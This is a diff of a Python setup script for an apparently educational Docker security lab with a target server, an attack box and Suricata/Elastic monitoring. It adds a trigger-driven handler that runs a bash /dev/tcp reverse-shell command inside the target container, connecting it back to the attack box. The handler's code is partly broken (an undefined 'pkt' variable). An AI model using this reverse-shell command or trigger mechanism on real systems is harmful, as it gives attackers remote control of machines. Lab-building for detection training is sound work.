@@ -5,13 +5,17 @@ import time
 import json
 import docker
 import signal
+import socket
+import psutil
 import argparse
 import requests
 import psycopg2
 import subprocess
+import multiprocessing as mp
 import espcap.espcap as espcap
 
 from io import BytesIO
+from scapy.all import *
 from mysql.connector import connect, Error
 
 
@@ -68,6 +72,35 @@ def service_check(address):
         response_status = response.status_code
 
     return 
+
+
+def rev_shell_handler(target_os):
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	sock.bind(("0.0.0.0", 9876))
+
+	while True:
+		print("Listening!")
+		data, (ip, port) = sock.recvfrom(2048)
+		if Ether in Ether(data):
+			print(data)
+			if ICMP in pkt:
+				cmd_in_container = api_client.exec_create(target_os, "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1")
+				result = api_client.exec_start(cmd_in_container, detach=True)
+ 				
+
+def get_uwe_net_interface():
+
+	uwe_net_interface = ""
+
+	addrs = psutil.net_if_addrs()
+	
+	for key, val in addrs.items():
+		for i in val:
+			if "172.18.0.1" in i:
+				uwe_net_interface = key
+				break
+	
+	return uwe_net_interface 
 
 
 def elastic_setup():
@@ -134,7 +167,11 @@ def log_monitor_setup():
         name="filebeat", 
         user="root", 
         environment=["output.elasticsearch.hosts=['172.18.0.10:9200']"],
-        volumes=['{}/resource_files/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), '/var/lib/docker/containers:/var/lib/docker/containers:ro', "/var/run/docker.sock:/var/run/docker.sock:ro"],
+        volumes=['{}/resource_files/Configs/filebeat.docker.yml:/usr/share/filebeat/filebeat.yml:ro'.format(dir_path), 
+        '{}/resource_files/Configs/filebeat_suricata.yml:/usr/share/filebeat/modules.d/suricata.yml:ro'.format(dir_path),
+        '{}/resource_files/logfiles:/var/log/suricata/:ro'.format(dir_path),
+        '/var/lib/docker/containers:/var/lib/docker/containers:ro', 
+        "/var/run/docker.sock:/var/run/docker.sock:ro"],
         command="-strict.perms=false")
         
         docker_client.networks.get("uwe_tek").connect(filebeat_container, 
@@ -145,18 +182,43 @@ def log_monitor_setup():
         containers.append("filebeat")
     
     return
+    
+
+def suricata_setup():
+
+    if container_check("suricata") != "running":
+
+        local_docker_check("uwe_suricata:101")
+        
+        subprocess.run(['gnome-terminal', '-x', 'bash', '-c', 'docker run -d --name suricata --net=host --cap-add=net_admin --cap-add=net_raw --cap-add=sys_nice -v {}/resource_files/logfiles:/var/log/suricata uwe_suricata:101 -i {}'.format(dir_path,get_uwe_net_interface())],  stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+
+        #suricata_container = docker_client.containers.create("jasonish/suricata:6.0", 
+        #detach=True, 
+        #name="suricata", 
+        #volumes=['{}/resource_files/logfiles:/var/log/suricata'.format(dir_path)],
+        #cap_add=["NET_ADMIN","NET_RAW", "SYS_NICE"],
+        #command="-i {}".format(get_uwe_net_interface))
+        
+        #docker_client.networks.get("host").connect(suricata_container)
+
+        #suricata_container.start()
+
+        containers.append("suricata")
+    
+    return
 
 
-def httpd_setup():
+def internal_httpd_setup():
 
     if container_check("httpd") != "running":
 
-        local_docker_check("httpd:2.4")
+        local_docker_check("uwe_httpd:101")
 
-        httpd_container = docker_client.containers.create("httpd:2.4", 
+        httpd_container = docker_client.containers.create("uwe_httpd:101", 
         detach=True, 
         name="httpd", 
-        volumes=['{}/resource_files/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), '{}/resource_files/htdocs:/usr/local/apache2/htdocs/'.format(dir_path)])
+        volumes=['{}/resource_files/Configs/httpd.conf:/usr/local/apache2/conf/httpd.conf:ro'.format(dir_path), '{}/resource_files/htdocs:/usr/local/apache2/htdocs/'.format(dir_path)],
+        cap_add=["NET_ADMIN","NET_RAW"])
 
         docker_client.networks.get("uwe_tek").connect(httpd_container, 
         ipv4_address="172.18.0.13")
@@ -164,10 +226,16 @@ def httpd_setup():
         httpd_container.start()
 
         container_check("httpd", "running")
+        
+        block_attackbox_inbound = api_client.exec_create("httpd", "iptables -A INPUT -s 172.18.0.157 -j DROP")
+        block_attackbox_outbound = api_client.exec_create("httpd", "iptables -A OUTPUT -d 172.18.0.157 -j DROP")
+        
+        result_inbound = api_client.exec_start(block_attackbox_inbound, detach=True)
+        result_outbound = api_client.exec_start(block_attackbox_outbound, detach=True)
 
         containers.append("httpd")
     
-    return "httpd:2.4 is up and running on 172.18.0.13\n"
+    return "uwe_httpd:101 is up and running on 172.18.0.13\n"
 
 
 def mysql_setup():
@@ -312,36 +380,27 @@ def postgres_setup():
 
 def confluence_setup():
 
-    if container_check("confluence") != "running":
+	if container_check("confluence") != "running":
 
-        local_docker_check("uwe_confluence:101")
+		local_docker_check("uwe_confluence:101")
 
-        #confluence_container = docker_client.containers.create("uwe_confluence:101", 
-        #detach=False, 
-        #name="confluence")
+		#Needs to be a interactive subprocess for the output to stdout to work
 
-        #docker_client.networks.get("uwe_tek").connect("confluence", 
-        #ipv4_address="172.18.0.19")
+		subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', 'docker run --name confluence --net uwe_tek --ip 172.18.0.19 -it uwe_confluence:101'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-        #confluence_container.start()
+		container_check("confluence", "running")
 
-        subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', 'docker run --name confluence --net uwe_tek --ip 172.18.0.19 -it uwe_confluence:101'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+		service_check("http://172.18.0.19:8090")
+		
+		cmd_in_container = api_client.exec_create("confluence", "nohup bash /tomcat_to_stdout.sh &")
+		
+		result = api_client.exec_start(cmd_in_container, detach=True)
 
-        container_check("confluence", "running")
-
-        containers.append("confluence")
-
-        # Attempts to do this through the docker API didn't work...?
-        #result = subprocess.run(['gnome-terminal', '-x', 'bash', '-c', 'docker exec confluence nohup /tomcat_to_stdout.sh &'], capture_output=True, text=True)
-
-        #print(result.stdout)
-        #print(result.stderr)
-
-        service_check("http://172.18.0.19:8090")
+		containers.append("confluence")
 
         #TODO - Add in docker exec for nohup
-    
-    return "uwe_confluence:101 is up and running on 172.18.0.19:8090\n"
+        
+	return "uwe_confluence:101 is up and running on 172.18.0.19:8090\n"
 
 
 def server_os_setup(target_os):
@@ -364,6 +423,19 @@ def server_os_setup(target_os):
         containers.append(target_os)
     
     return "uwe_{}:101 is up and running on 172.18.0.200\n".format(target_os)
+    
+
+def container_attackbox():
+	
+	if container_check("AttackBox") != "running":
+
+		local_docker_check("uwe_attackbox:101")
+
+		subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', 'docker run --name AttackBox --net uwe_tek --ip 172.18.0.157 -it uwe_attackbox:101'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+
+		containers.append("AttackBox")
+    
+	return "{} is up and running on 172.18.0.157\n".format("AttackBox")
 
 
 def traffic_creation_setup():
@@ -459,45 +531,44 @@ if __name__ == '__main__':
         exit("{} is not a support os. Please select a supported OS:\n{}".format(target_os,str(supported_os)))
 
     sub_network_check()
-
-    #mysql_setup()
-
+   
     running_container_info += postgres_setup()
     running_container_info += confluence_setup()
-
+	
+	#mysql_setup()
     #running_container_info += phpmyadmin_setup()
     #running_container_info += joomla_setup()
 
-    #running_container_info += httpd_setup()
-
+    running_container_info += internal_httpd_setup()
 
     running_container_info += server_os_setup(target_os.lower())
+    
+    running_container_info += container_attackbox()
 
     # Done last to avoid polluting the logs with test connections
     running_container_info += elastic_setup()
     running_container_info += kibana_setup()
 
     log_monitor_setup()
+    suricata_setup()
 
     #traffic_creation_setup()
 
     print("----------------------------------------------------------------")
     print(running_container_info)
     print("----------------------------------------------------------------")
-
-    cmd_in_container = api_client.exec_create("confluence", "nohup bash /tomcat_to_stdout.sh &")
-
-    result = api_client.exec_start(cmd_in_container, detach=True)
-
-    print("cmd in containr: ", result)
+    
+    # Run as multiprocess in background so it isn't blocking
+    proc = mp.Process(target = rev_shell_handler, args = (target_os, ))
+    proc.start()
 
     # Make chunk sizing dynamic / changeable on the fly
 
     #TODO - make the blacklist ammendable so we can add confluence etc on the fly
 
-    #filter_string = "src net 172.18.0.0/24 and dst net 172.18.0.0/24 and host not 172.18.0.10 and host not 172.18.0.11"
+    filter_string = "src net 172.18.0.0/24 and dst net 172.18.0.0/24 and host not 172.18.0.10 and host not 172.18.0.11 and host not 172.18.0.12"
 
-    filter_string = "host 172.18.0.1 and host not 172.18.0.10 and host not 172.18.0.11"
+    #filter_string = "host 172.18.0.1 and host not 172.18.0.10 and host not 172.18.0.11"
 
     # How small / large an amount of data is cached before being sent to kibana
     chunk_size = 50
